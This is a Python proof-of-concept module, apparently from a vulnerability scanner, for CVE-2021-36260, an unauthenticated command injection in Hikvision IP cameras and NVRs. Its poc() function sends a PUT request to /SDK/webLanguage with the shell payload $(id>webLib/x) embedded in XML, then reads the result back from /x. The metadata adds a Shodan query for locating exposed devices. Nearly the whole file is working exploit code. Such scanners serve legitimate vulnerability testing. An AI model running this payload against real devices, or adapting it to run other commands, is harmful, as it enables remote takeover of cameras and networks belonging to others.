import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Hikvision IP camera/NVR - Unauthenticated RCE''',
        "description": '''A command injection vulnerability in the web server of some Hikvision product. Due to the insufficient input validation, attacker can exploit the vulnerability to launch a command injection attack by sending some messages with malicious commands.''',
        "severity": "critical",
        "references": [
            "https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html", 
            "https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-36260", 
            "https://github.com/Aiminsun/CVE-2021-36260"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-36260",
            "cwe-id": "CWE-77,CWE-20"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''http.favicon.hash:999357577'''
        },
        "tags": ["cve", "cve2021", "hikvision", "rce", "iot", "intrusive"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/SDK/webLanguage"""
        method = "PUT"
        data = """<?xml version="1.0" encoding="UTF-8"?><language>$(id>webLib/x)</language>"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/x"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp0.status_code == 500 and resp1.status_code == 200 and "uid=" in resp1.text and "gid=" in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url